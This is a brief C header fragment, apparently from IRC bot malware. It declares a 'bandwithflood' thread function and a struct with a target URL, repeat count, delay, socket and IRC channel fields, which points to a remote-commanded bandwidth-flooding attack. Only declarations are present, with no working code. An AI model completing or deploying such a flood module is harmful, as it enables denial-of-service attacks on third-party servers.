

#ifndef NO_BANDWITH
DWORD WINAPI bandwithflood(LPVOID param);

typedef struct bandwith 
{
	char szUrl[256];
	int iTimes;
	int iDelay;
	SOCKET bsock;
	char szAction[16];
	char szChannel[16];
} bandwith;
#endif